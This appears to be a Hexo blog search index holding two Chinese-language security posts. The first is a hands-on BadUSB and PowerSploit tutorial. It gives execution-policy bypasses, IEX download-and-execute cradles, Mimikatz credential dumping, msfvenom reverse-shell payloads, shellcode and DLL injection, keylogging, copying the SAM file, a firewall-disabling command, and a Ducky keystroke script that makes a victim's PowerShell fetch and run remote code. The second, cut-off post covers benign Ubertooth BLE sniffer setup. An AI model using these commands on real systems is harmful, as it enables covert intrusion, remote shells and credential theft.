<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>PowerSploit与Badusb联合进行渗透</title>
    <url>/2018/06/17/IOT/PowerSploit%E4%B8%8EBadusb%E8%81%94%E5%90%88%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<h4 id="0x00-PowerShell-介绍"><a href="#0x00-PowerShell-介绍" class="headerlink" title="0x00 PowerShell 介绍"></a>0x00 PowerShell 介绍</h4><p><strong><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/111.jpg" alt="img"></strong> </p>
<p>   <strong>Windows PowerShell</strong> <strong>是一种命令行外壳程序和脚本环境，使命令行用户和编写者可以利用，NET Framework的强大功能。</strong></p>
<p>​    <strong>它引入了许多非常有用的新概念，从而进一步扩展了您在Windows命令提示符和Windows Script Host 环境中获得的知识和创建的脚本。</strong></p>
<p>​    <strong>PowerShell诞生于vista时代，在系统中有着强大的功能，可以方便的调用Windows API等等。很多多人忽略了他，但其是一座待开发的金矿，在后渗透测试中产给我们带来意外的惊喜。</strong></p>
<a id="more"></a>

<h4 id="0x01-PowerShell执行策略"><a href="#0x01-PowerShell执行策略" class="headerlink" title="0x01 PowerShell执行策略"></a>0x01 PowerShell执行策略</h4><p><strong>输入：get-executionpolicy 查看现用执行策略</strong></p>
<p><strong>Restricted</strong>—默认的设置，不允许任何script</p>
<p><strong>AllSigned</strong>—只能运行经过数字签名的script</p>
<p><strong>RemoteSigned</strong>—运行本地的script不需要数字签名，但是要运行从网络上下载的script就必须要有数字签名。</p>
<p><strong>Unrestricted</strong>—允许所有的script</p>
<p><strong>修改策略：set-executionpolicy [策略名称]</strong></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/222.png" alt="img"></p>
<p><strong>测试：</strong></p>
<p>“$PSVersionTable.PSVersion”写入test.psl 如果脚本成功执行就是打印出这句话</p>
<p>执行：</p>
<p>.\test.ps1 如果是普通用户的话会被禁用</p>
<p><strong>绕过：</strong></p>
<p><strong>powershell.exe –ExecutionPolicy Bypass –file .\test.ps1</strong></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/333.png" alt="img"></p>
<p><strong>注意：想要修改执行策略需要超级管理员权限，因此对于内网渗透提权是一个打击。但是可以绕过执行策略限制。</strong></p>
<p><strong>本地权限绕过执行：</strong></p>
<p><strong>Powershell.exe –ExecutionPolicy Bypass –File .\xxx.ps1</strong></p>
<p><strong>本地隐藏权限绕过执行脚本：</strong></p>
<p><strong>PowerShell.exe –ExecutionPolicy Bypass –Nologo –NonInteractive –Noprofile –WindowStyle Hidden –File xxx.ps1</strong></p>
<p><strong>直接用IEX下载远程的PS1脚本回来权限绕过执行：</strong></p>
<p><strong>Powershell “IEX(New-ObjectNet.WebClient).DownloadString(‘<a href="https://is.gd/oeoFul’)”;Invoke-Mimikatz">https://is.gd/oeoFul’)”;Invoke-Mimikatz</a> –dumpCreds”</strong></p>
<h4 id="0x02-PowerSploit"><a href="#0x02-PowerSploit" class="headerlink" title="0x02 PowerSploit"></a>0x02 PowerSploit</h4><p> <strong>Powersploit**</strong>是一款基于powershell的后渗透（Post-exploitation）框架，集成大量渗透相关模块和功能。**</p>
<p><strong>Github</strong>地址：<strong>[</strong>powersploit](<a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a>)</p>
<p>将下载下来的powersploit文件夹内的所有文件（不含powersploit文件夹）拷贝到/var/www/html/ 目录下</p>
<h5 id="模块介绍"><a href="#模块介绍" class="headerlink" title="模块介绍"></a>模块介绍</h5><table>
<thead>
<tr>
<th><strong>codexecution</strong></th>
<th>在目标主机执行代码</th>
</tr>
</thead>
<tbody><tr>
<td><strong>ScriptModification</strong></td>
<td>在目标主机上创建或修改脚本</td>
</tr>
<tr>
<td><strong>Persistence</strong></td>
<td>后门脚本（持续性控制）</td>
</tr>
<tr>
<td><strong>AntivirusBypass</strong></td>
<td>发现杀软查杀特征</td>
</tr>
<tr>
<td><strong>Exfiltration</strong></td>
<td>目标主机上的信息收集工具</td>
</tr>
<tr>
<td><strong>Mayhem</strong></td>
<td>蓝屏等破环形脚本</td>
</tr>
<tr>
<td><strong>Recon</strong></td>
<td>以目标主机为跳板进行内网信息侦查</td>
</tr>
</tbody></table>
<h5 id="功能介绍"><a href="#功能介绍" class="headerlink" title="功能介绍"></a>功能介绍</h5><h5 id="1-Invoke-Shellcode"><a href="#1-Invoke-Shellcode" class="headerlink" title="(1)Invoke-Shellcode"></a>(1)Invoke-Shellcode</h5><p><strong>将shellcode插入选择的进程ID或本地PowerShell中</strong></p>
<p>IEX (New-Object Net.WebClient).DownloadString(“<a href="http://IP/CodeExecution/Invoke–Shellcode.ps1”">http://IP/CodeExecution/Invoke–Shellcode.ps1”</a>)</p>
<p><strong>1.攻击者生成payload反弹木马</strong></p>
<p>msfvenom –p windows/meterpreter/reverse_https lhost=192.168.98.94 lport=5555 –f powershell –o /var/www/html/payload</p>
<p><strong>2.监听本机 5555 端口</strong></p>
<p>使用msf exploit/multi/handler模块即可</p>
<p><strong>3.下载相应脚本</strong></p>
<p>IEX (New-Object Net.WebClient).DownloadString(“<a href="http://192.168.98.94/CodeExecution/Invoke-Shellcode.ps1”">http://192.168.98.94/CodeExecution/Invoke-Shellcode.ps1”</a>)</p>
<p><strong>4.下载反弹木马</strong></p>
<p>IEX (New-Object Net.Webclient).DownloadString(“<a href="http://192.168.98.94/test”">http://192.168.98.94/test”</a>)</p>
<p><strong>5.在powershell下运行</strong></p>
<p>Invoke-Shellcode -Shellcode($buf)</p>
<p><strong>完成以上三个命令得到一个meterpreter后渗透会话</strong></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/444.png" alt="img"></p>
<p><strong>注入进程：</strong></p>
<p><strong>1.使用 PS 或者 Get-Process 来获取当前进程</strong></p>
<p>ps | Get-Process</p>
<p><strong>2.启动一个记事本，并把他设置为隐藏的</strong></p>
<p>Start-Process C:\Windows\system32\notepad.exe –windowStyle Hidden</p>
<p><strong>3.插入进程中,同样反弹成功</strong></p>
<p>Invoke-Shellcode -ProcessID PID -Shellcode($buf) –Force</p>
<h5 id="2-Invoke-DLLinjection-dll注入"><a href="#2-Invoke-DLLinjection-dll注入" class="headerlink" title="(2)Invoke-DLLinjection .dll注入"></a>(2)Invoke-DLLinjection .dll注入</h5><p><strong>1.下载相应脚本</strong></p>
<p>IEX (New-Object Net.WebClient).DownloadString(“<a href="http://192.168.98.94/CodeExecution/Invoke-DllInjection.ps1”">http://192.168.98.94/CodeExecution/Invoke-DllInjection.ps1”</a>)</p>
<p><strong>2.生成反弹dll文件</strong></p>
<p>2.msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.98.94 lport=5555 -f dll -o /var/www/html/test.dll</p>
<p><strong>3.不可以使用powershell进行下载，之后可以使用badusb进行下载执行</strong></p>
<p>IEX (New-Object Net.WebClient).DownloadString(“<a href="http://192.168.98.94/test.dll”">http://192.168.98.94/test.dll”</a>)</p>
<p><strong>4.注入进程，切换payload，开始监听，成功反弹</strong></p>
<p>Invoke-DllInjection -ProcessID PID -Dll .\test.dll</p>
<h4 id="3-Invoke-Portscan端口扫描"><a href="#3-Invoke-Portscan端口扫描" class="headerlink" title="(3)Invoke-Portscan端口扫描"></a>(3)Invoke-Portscan端口扫描</h4><p><strong>1.下载相应脚本</strong></p>
<p>IEX (New-Object Net.WebClient).DownloadString(“<a href="http://192.168.98.94/Recon/Invoke-Portscan.ps1”">http://192.168.98.94/Recon/Invoke-Portscan.ps1”</a>)</p>
<p><strong>2.进行端口扫描</strong></p>
<p>Invoke-Portscan -Hosts 192.168.98.95.1,192.168.98.96 -Ports “80,22,3389”</p>
<h5 id="4-Invoke-Mimikatz-Mimikatz"><a href="#4-Invoke-Mimikatz-Mimikatz" class="headerlink" title="(4)Invoke-Mimikatz Mimikatz"></a>(4)Invoke-Mimikatz Mimikatz</h5><p><strong>1.下载相应脚本</strong></p>
<p>IEX (New-Object Net.WebClient).DownloadString(“<a href="http://192.168.98.94/Exfiltration/Invoke-Mimikatz.ps1”">http://192.168.98.94/Exfiltration/Invoke-Mimikatz.ps1”</a>)</p>
<p><strong>2.读取密码（需要管理员权限）</strong></p>
<p>Invoke-Mimikat –DumpCreds</p>
<h5 id="5-Get-Keystrokes-键盘记录"><a href="#5-Get-Keystrokes-键盘记录" class="headerlink" title="(5)Get-Keystrokes 键盘记录"></a>(5)Get-Keystrokes 键盘记录</h5><p><strong>1.下载相应脚本</strong></p>
<p>IEX (New-Object Net.WebClient).DownloadString(“<a href="http://192.168.98.94/Exfiltration/Get-Keystrokes.ps1”">http://192.168.98.94/Exfiltration/Get-Keystrokes.ps1”</a>)</p>
<p><strong>2.键盘记录（记录十分详细，连鼠标点击也可以记录，需要管理员权限）</strong></p>
<p>Get-Keystrokes –LogPath + &lt;保存位置&gt;</p>
<h5 id="6-Invoke-NinjaCopy-文件复制"><a href="#6-Invoke-NinjaCopy-文件复制" class="headerlink" title="(6)Invoke-NinjaCopy 文件复制"></a>(6)Invoke-NinjaCopy 文件复制</h5><p><strong>1.下载相应的脚本</strong></p>
<p>IEX (New-Object Net.WebClient).DownloadString(“<a href="http://192.168.98.94/Exfiltration/Invoke-NinjaCopy.ps1”">http://192.168.98.94/Exfiltration/Invoke-NinjaCopy.ps1”</a>)</p>
<p><strong>2.复制文件（需要管理员权限，一开机就加锁的sam文件也可以复制）</strong></p>
<p>Invoke-NinjaCopy –Path “文件目录”-LocalDestination “复制目录”</p>
<h4 id="0x03-HID-Attack"><a href="#0x03-HID-Attack" class="headerlink" title="0x03 HID Attack"></a>0x03 HID Attack</h4><p><strong>HID**</strong>是Human Interface Device的缩写，例如键盘、鼠标与等。不过HID设备并不一定要有人机接口，只要符合HID类别规范的设备都是HID设备。一般来讲针对HID的攻击主要集中在键盘鼠标上，因为只要控制了用户键盘，基本上就等于控制了用户的电脑。攻击者会把攻击隐藏在一个正常的鼠标键盘中，当用户将含有攻击向量的鼠标或键盘，插入电脑时，恶意代码会被加载并执行。**</p>
<p>由于电脑对这类设备缺少严格的检测措施，只是简单的识别设备类型，就允许设备对电脑进行各项操作。所以，通过修改篡改设备反馈信息，就可以很轻松的让电脑将其他设备误认为HID设备，从而获取控制权限。尤其是USB和蓝牙这类即插即用接口出现，导致HID Attack成为重要方式。例如，Bad USB就是USB类攻击的典型代表。</p>
<p>通过硬件直接插入对方电脑，让对方电脑执行代码，达到干扰、控制主机或者窃取信息等目的。</p>
<h4 id="0x04-Badusb"><a href="#0x04-Badusb" class="headerlink" title="0x04 Badusb"></a>0x04 Badusb</h4><p>​    <strong>一般来说，USB 设备有两种，一种是 Host，比如电脑，可以去读取其他 USB 设备的数据，另外一种是 Device，比如键盘鼠标优盘。所以从根本上来说，制作一个 Bad USB 核心要求只有一个，就是自身可以作为 USB Device。</strong></p>
<p>BadUSB最可怕的一点是恶意代码存在于U盘的固件中，由于PC上的杀毒软件无法访问到U盘存放固件的区域，因此也就意味着杀毒软件和U盘格式化都无法应对BadUSB进行攻击。</p>
<p> <strong>U盘由芯片控制器和闪存两部分组成，芯片控制器负责与PC的通讯和识别，闪存用来做数据存储；闪存中有一部分区域用来存放U盘的固件，它的作用类似于操作系统，控制软硬件交互；固件无法通过普通手段进行读取。</strong></p>
<p>BadUSB就是通过对U盘的固件进行逆向重新编程，相当于改写了U盘的操作系统而进行攻击的。</p>
<p><strong>USB协议漏洞:</strong></p>
<p><strong>现在的USB设备很多，比如音视频设备、摄像头等，因此要求系统提供最大的兼容性，甚至免驱；所以在设计USB标准的时候没有要求每个USB设备像网络设备那样占有一个唯一可识别的MAC地址让系统进行验证，而是允许一个USB设备具有多个输入输出设备的特征。这样就可以通过重写U盘固件，伪装成一个USB键盘，并通过虚拟键盘输入集成到U盘固件中的指令和代码而进行攻击。</strong></p>
<h4 id="0x05-常见的Badusb"><a href="#0x05-常见的Badusb" class="headerlink" title="0x05 常见的Badusb"></a>0x05 常见的Badusb</h4><h5 id="1-hak5的USB-RUBBER-DUCKY"><a href="#1-hak5的USB-RUBBER-DUCKY" class="headerlink" title="1.hak5的USB RUBBER DUCKY"></a>1.hak5的USB RUBBER DUCKY</h5><p><a href="https://hakshop.com/products/usb-rubber-ducky-deluxe">https://hakshop.com/products/usb-rubber-ducky-deluxe</a></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/555.png" alt="img"></p>
<h5 id="2-Digispark-Attiny85微型-USB接口开发板"><a href="#2-Digispark-Attiny85微型-USB接口开发板" class="headerlink" title="2.Digispark(Attiny85微型) USB接口开发板"></a>2.Digispark(Attiny85微型) USB接口开发板</h5><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/1111.png" alt="img">)<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/666.png" alt="img"></p>
<h5 id="3-国内大多是采用的Teensy-或者Arduino-Leonardo，淘宝上还有厂商制作的U盘模样的Arduino-Leonardo"><a href="#3-国内大多是采用的Teensy-或者Arduino-Leonardo，淘宝上还有厂商制作的U盘模样的Arduino-Leonardo" class="headerlink" title="3.国内大多是采用的Teensy 或者Arduino Leonardo，淘宝上还有厂商制作的U盘模样的Arduino Leonardo"></a>3.国内大多是采用的Teensy 或者Arduino Leonardo，淘宝上还有厂商制作的U盘模样的Arduino Leonardo</h5><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/777.png" alt="img"></p>
<h4 id="0x06-Digispark"><a href="#0x06-Digispark" class="headerlink" title="0x06 Digispark"></a>0x06 Digispark</h4><p><strong>Digispark**</strong>是一个基于ATTINY85微控制器的USB开发板，体积小且价钱便宜，功能方面则没有Arduino般强大。代码与Arduino大同小异，更可贵的是使用Arduino IDE来开发。淘宝上直接搜索Digispark就能看到了，价格在7-10元不等。**</p>
<h5 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h5><p><strong>百度云链接：</strong></p>
<p><a href="https://pan.baidu.com/s/1MmbIlSmIL3wGmaRO4RPjTA">https://pan.baidu.com/s/1MmbIlSmIL3wGmaRO4RPjTA</a> <strong>密码:qaqs</strong></p>
<p><strong>Digispark官方教程</strong></p>
<p><a href="http://digistump.com/wiki/digispark/tutorials/connecting">http://digistump.com/wiki/digispark/tutorials/connecting</a></p>
<p><strong>Arduino IDE：</strong></p>
<p><a href="https://www.arduino.cc/en/Main/Software">https://www.arduino.cc/en/Main/Software</a></p>
<p><strong>Digispark的驱动：</strong></p>
<p><a href="https://github.com/digistump/DigistumpArduino/releases/download/1.6.7/Digistump.Drivers.zip">https://github.com/digistump/DigistumpArduino/releases/download/1.6.7/Digistump.Drivers.zip</a></p>
<p><strong>payload hak5的USB-Rubber-Ducky：</strong></p>
<p><a href="https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads">https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads</a></p>
<p><strong>Digispark翻译脚本：</strong></p>
<p><a href="https://github.com/toxydose/Duckyspark">https://github.com/toxydose/Duckyspark</a></p>
<h5 id="1-安装驱动"><a href="#1-安装驱动" class="headerlink" title="1.安装驱动"></a>1.安装驱动</h5><p>Digistump.Drivers目录下</p>
<p>32位系统安装 DPinst.exe</p>
<p>64位系统安装 DPinst64.exe</p>
<p>注意下图提示框的选择：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/111.png" alt="img"></p>
<h5 id="2-安装IDE"><a href="#2-安装IDE" class="headerlink" title="2.安装IDE"></a>2.安装IDE</h5><p>解压缩 arduino-1.8.3-windows-IDE.zip</p>
<p>拷贝到C:\Program Files\arduino-1.8.3目录下</p>
<p>运行：arduino.exe</p>
<h5 id="3-设置arduino"><a href="#3-设置arduino" class="headerlink" title="3.设置arduino"></a>3.设置arduino</h5><p><strong>第一步：</strong></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image1.png" alt="img"></p>
<p><strong>第二步：填写附加开发板管理器网址：<a href="http://digistump.com/package_digistump_index.json">http://digistump.com/package_digistump_index.json</a></strong></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image2.png" alt="img"></p>
<p><strong>第三步 打开开发板管理器</strong></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/222-1.png" alt="img"></p>
<p><strong>等待下载完</strong></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/333-1.png" alt="img"></p>
<p><strong>然后在“类型”中选择“贡献”</strong></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/444-1.png" alt="img"></p>
<p><strong>点击安装Digistump AVR boards by Digistump</strong></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/666-1.png" alt="img"></p>
<p><strong>等待下载的完成</strong></p>
<p><strong>出现下图时表示安装完成了：</strong></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/777-1.png" alt="img"></p>
<p><strong>工具-开发板- 选择：Digispark(Default -16.5Mhz):-如下图</strong></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/888.png" alt="img"></p>
<p><strong>然后如下图操作</strong></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/999.png" alt="img"></p>
<p><strong>项目-加载库-添加一个.zip库……（此处无法截图）</strong></p>
<p><strong>然后将Keyboard.zip载入</strong></p>
<h4 id="0x07-HID-Attack-测试"><a href="#0x07-HID-Attack-测试" class="headerlink" title="0x07 HID Attack 测试"></a>0x07 HID Attack 测试</h4><h5 id="1-使用hak5-USB-RUBBER-DUCKY-payload进行测试"><a href="#1-使用hak5-USB-RUBBER-DUCKY-payload进行测试" class="headerlink" title="1.使用hak5-USB RUBBER DUCKY payload进行测试"></a>1.使用hak5-USB RUBBER DUCKY payload进行测试</h5><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/ccc.png" alt="img"></p>
<h4 id="2-使用PowerSploit进行联合测试"><a href="#2-使用PowerSploit进行联合测试" class="headerlink" title="2.使用PowerSploit进行联合测试"></a>2.使用PowerSploit进行联合测试</h4><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/111111.jpg" alt="img"></p>
<h6 id="1-创建一个test-txt文件，内容如下："><a href="#1-创建一个test-txt文件，内容如下：" class="headerlink" title="1.创建一个test.txt文件，内容如下："></a>1.创建一个test.txt文件，内容如下：</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DELAY 5000</span><br><span class="line"></span><br><span class="line">GUI r</span><br><span class="line"></span><br><span class="line">DELAY 500</span><br><span class="line"></span><br><span class="line">STRING cmd.exe &#x2F;T:01 &#x2F;K mode CON: COLS&#x3D;16 LINES&#x3D;1</span><br><span class="line"></span><br><span class="line">DELAY 400</span><br><span class="line"></span><br><span class="line">ENTER</span><br><span class="line"></span><br><span class="line">DELAY 500</span><br><span class="line"></span><br><span class="line">ENTER</span><br><span class="line"></span><br><span class="line">DELAY 400</span><br><span class="line"></span><br><span class="line">STRING powershell</span><br><span class="line"></span><br><span class="line">DELAY 500</span><br><span class="line"></span><br><span class="line">ENTER</span><br><span class="line"></span><br><span class="line">DELAY 500</span><br><span class="line"></span><br><span class="line">STRING IEX(New-Object Net.Webclient).DownloadString(“http:&#x2F;&#x2F;192.168.99.135&#x2F;CodeExecution&#x2F;Invoke-Shellcode.ps1”)&#x2F;&#x2F;地址是kali的</span><br><span class="line"></span><br><span class="line">DELAY 500</span><br><span class="line"></span><br><span class="line">ENTER</span><br><span class="line"></span><br><span class="line">DELAY 500</span><br><span class="line"></span><br><span class="line">STRING IEX (New-Object Net.Webclient).DownloadString(“http:&#x2F;&#x2F;192.168.99.135&#x2F;xpy”)</span><br><span class="line"></span><br><span class="line">DELAY 500</span><br><span class="line"></span><br><span class="line">ENTER</span><br><span class="line"></span><br><span class="line">DELAY 500</span><br><span class="line"></span><br><span class="line">STRING Invoke-Shellcode -Shellcode ($buf)</span><br><span class="line"></span><br><span class="line">DELAY 500</span><br><span class="line"></span><br><span class="line">ENTER</span><br><span class="line"></span><br><span class="line">DELAY 2000</span><br><span class="line"></span><br><span class="line">ENTER</span><br><span class="line"></span><br><span class="line">DELAY 5000</span><br></pre></td></tr></table></figure>



<h5 id="2-运行payload转化脚本"><a href="#2-运行payload转化脚本" class="headerlink" title="2.运行payload转化脚本"></a>2.运行payload转化脚本</h5><p>python Duckyspark_translator.py e:\test1.txt e:\powershell</p>
<h5 id="3-打开-生成的powershell-ino-文件将其内容拷贝到arduino-中编译"><a href="#3-打开-生成的powershell-ino-文件将其内容拷贝到arduino-中编译" class="headerlink" title="3.打开 生成的powershell.ino 文件将其内容拷贝到arduino 中编译"></a>3.打开 生成的powershell.ino 文件将其内容拷贝到arduino 中编译</h5><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/333.jpg" alt="img"></p>
<h5 id="4-当编译没有错误时-插入badusb-然后点击“上传”（如下图）"><a href="#4-当编译没有错误时-插入badusb-然后点击“上传”（如下图）" class="headerlink" title="4.当编译没有错误时 插入badusb 然后点击“上传”（如下图）"></a>4.当编译没有错误时 插入badusb 然后点击“上传”（如下图）</h5><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/2222.jpg" alt="img"></p>
<h5 id="5-监听相应端口"><a href="#5-监听相应端口" class="headerlink" title="5.监听相应端口"></a>5.监听相应端口</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole use exploit&#x2F;multi&#x2F;handler </span><br><span class="line"></span><br><span class="line">set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line"></span><br><span class="line">set lhost 192.168.99.135 </span><br><span class="line"></span><br><span class="line">set lport 5555 run</span><br></pre></td></tr></table></figure>



<h5 id="6-msfvenom生成一个powershell脚本："><a href="#6-msfvenom生成一个powershell脚本：" class="headerlink" title="6.msfvenom生成一个powershell脚本："></a>6.msfvenom生成一个powershell脚本：</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.99.135 LPORT&#x3D;5555 -f powershell -o &#x2F;var&#x2F;www&#x2F;html&#x2F;test</span><br></pre></td></tr></table></figure>



<h5 id="7-然后主机插入badusb-反弹成功"><a href="#7-然后主机插入badusb-反弹成功" class="headerlink" title="7.然后主机插入badusb 反弹成功"></a>7.然后主机插入badusb 反弹成功</h5><h4 id="3-使用自己搭建的ftp等互联网服务进行渗透"><a href="#3-使用自己搭建的ftp等互联网服务进行渗透" class="headerlink" title="3.使用自己搭建的ftp等互联网服务进行渗透"></a>3.使用自己搭建的ftp等互联网服务进行渗透</h4><h5 id="（1）用管理员权限打开cmd，进入用户目录，关闭防火墙。"><a href="#（1）用管理员权限打开cmd，进入用户目录，关闭防火墙。" class="headerlink" title="（1）用管理员权限打开cmd，进入用户目录，关闭防火墙。"></a>（1）用管理员权限打开cmd，进入用户目录，关闭防火墙。</h5><p>注1：如果用户防火墙开着在下载文件的时候会弹出提示，这样操作就会失败。</p>
<p>注2：如果用户装了安全软件如360这种，关闭防火墙的时候会有告警弹出，也会失败。</p>
<p>cd %USERPROFILE%</p>
<p>netsh firewall set opmode mode=disable profile =ALL</p>
<h5 id="（2）通过执行ftp命令txt文件进行利用"><a href="#（2）通过执行ftp命令txt文件进行利用" class="headerlink" title="（2）通过执行ftp命令txt文件进行利用"></a><strong>（2）通过执行ftp命令txt文件进行利用</strong></h5><p><strong>ftp -s:ftp.txt</strong></p>
<h4 id="4-利用其他小工具、更加复杂的命令等你可以想到的骚思路来进行渗透"><a href="#4-利用其他小工具、更加复杂的命令等你可以想到的骚思路来进行渗透" class="headerlink" title="4. 利用其他小工具、更加复杂的命令等你可以想到的骚思路来进行渗透"></a>4. 利用其他小工具、更加复杂的命令等你可以想到的骚思路来进行渗透</h4><h4 id="1-tv-dump-exe-获取teamviewer用户名密码"><a href="#1-tv-dump-exe-获取teamviewer用户名密码" class="headerlink" title="1.tv_dump.exe 获取teamviewer用户名密码"></a>1.tv_dump.exe 获取teamviewer用户名密码</h4><h4 id="2-mimikatz-WebBrowserPassView-等"><a href="#2-mimikatz-WebBrowserPassView-等" class="headerlink" title="2.mimikatz | WebBrowserPassView 等"></a>2.mimikatz | WebBrowserPassView 等</h4><h4 id="3-包括一些ukey接口以及终端服务机器等"><a href="#3-包括一些ukey接口以及终端服务机器等" class="headerlink" title="3.包括一些ukey接口以及终端服务机器等"></a>3.包括一些ukey接口以及终端服务机器等</h4><p><strong>ps：</strong></p>
<p>1.win7的补丁可能破坏了powershell，导致崩溃，若崩溃，就将tcp协议换为http协议，再进行回连。</p>
<p>2.注意回连不成功，可能是没有打开apache服务器，没开SSH。</p>
<p>3.用Arduino打开时，一个文件夹下只能有一个ino文件，否则编译时会出错。</p>
<p>4.用python 3.多的版本运行脚本</p>
<p>5.在该脚本路径下敲cmd运行脚本</p>
<p>6.txt放在c盘之外再编译成powershell脚本</p>
<p>7.编译时去掉注释</p>
]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>IOT</tag>
        <tag>BadUsb</tag>
        <tag>PowerSploit</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Ubertooth one扫描嗅探低功耗蓝牙</title>
    <url>/2020/10/14/IOT/%E4%BD%BF%E7%94%A8Ubertooth-one%E6%89%AB%E6%8F%8F%E5%97%85%E6%8E%A2%E4%BD%8E%E5%8A%9F%E8%80%97%E8%93%9D%E7%89%99/</url>
    <content><![CDATA[<h2 id="0x00-本机环境"><a href="#0x00-本机环境" class="headerlink" title="0x00 本机环境"></a>0x00 本机环境</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mac osx 10.15.5</span><br><span class="line">VMware Fusion 11.5.1</span><br><span class="line">Ubuntu 18.04</span><br><span class="line">Ubertooth One</span><br></pre></td></tr></table></figure>



<a id="more"></a>

<h2 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h2><h3 id="1-安装lib库"><a href="#1-安装lib库" class="headerlink" title="1. 安装lib库"></a>1. 安装lib库</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install python-software-properties</span><br><span class="line">add-apt-repository ppa:pyside</span><br><span class="line">apt-get update</span><br><span class="line">apt-get install libnl-3-dev libusb-1.0-0-dev pyside-tools</span><br></pre></td></tr></table></figure>

<h3 id="2-安装libbtbb"><a href="#2-安装libbtbb" class="headerlink" title="2. 安装libbtbb"></a>2. 安装libbtbb</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;github.com&#x2F;greatscottgadgets&#x2F;libbtbb&#x2F;archive&#x2F;2015-09-R2.tar.gz -O libbtbb-2015-09-R2.tar.gz</span><br><span class="line">tar xf libbtbb-2015-09-R2.tar.gz</span><br><span class="line">cd libbtbb-2015-09-R2</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">cmake ..</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>

<h3 id="3-安装ubertooth"><a href="#3-安装ubertooth" class="headerlink" title="3. 安装ubertooth"></a>3. 安装ubertooth</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install ubertooth</span><br></pre></td></tr></table></figure>

<blockquote>
<p>报错安装：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install pkg-config</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="4-安装wireshark"><a href="#4-安装wireshark" class="headerlink" title="4. 安装wireshark"></a>4. 安装wireshark</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install wireshark</span><br></pre></td></tr></table></figure>

<h3 id="5-安装kismet"><a href="#5-安装kismet" class="headerlink" title="5. 安装kismet"></a>5. 安装kismet</h3><h4 id="a-直接安装"><a href="#a-直接安装" class="headerlink" title="a. 直接安装"></a>a. 直接安装</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install ckermit </span><br></pre></td></tr></table></figure>

<p>在~中创建.kermrc，然后输入如下配置信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set line          &#x2F;dev&#x2F;ttyUSB0  </span><br><span class="line">set speed         115200  </span><br><span class="line">set carrier-watch off  </span><br><span class="line">set handshake     none  </span><br><span class="line">set flow-control none  </span><br><span class="line">robust  </span><br><span class="line">set file type     bin  </span><br><span class="line">set file name     lit  </span><br><span class="line">set rec pack      1000  </span><br><span class="line">set send pack     1000  </span><br><span class="line">set window        5  </span><br></pre></td></tr></table></figure>



<h4 id="b-编译安装"><a href="#b-编译安装" class="headerlink" title="b. 编译安装"></a>b. 编译安装</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;kismetwireless.net&#x2F;code&#x2F;kismet-2020-09-R1.tar.xz</span><br><span class="line">tar xf kismet-2020-09-R1.tar.xz</span><br><span class="line">cd kismet-2020-09-R1</span><br><span class="line">ln -s ..&#x2F;ubertooth-2015-09-R2&#x2F;host&#x2F;kismet&#x2F;plugin-ubertooth .</span><br><span class="line">.&#x2F;configure</span><br><span class="line">make &amp;&amp; make plugins</span><br><span class="line">sudo make suidinstall</span><br><span class="line">sudo make plugins-install</span><br></pre></td></tr></table></figure>

<blockquote>
<p>报错安装：</p>
